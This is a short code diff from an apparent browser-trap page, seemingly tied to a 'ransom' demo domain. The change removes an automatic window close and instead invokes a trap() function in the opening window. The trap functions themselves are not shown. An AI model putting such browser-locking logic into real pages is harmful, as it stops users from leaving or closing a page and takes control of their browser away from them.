@@ -18,7 +18,5 @@ defence();
 if (window.opener === null) trap();
 detectClose(window.opener, "https://ransom.ndev.tk/");
   
-setTimeout(function(){
-window.close()
-}, 3000);
+window.opener.trap();
 </script>
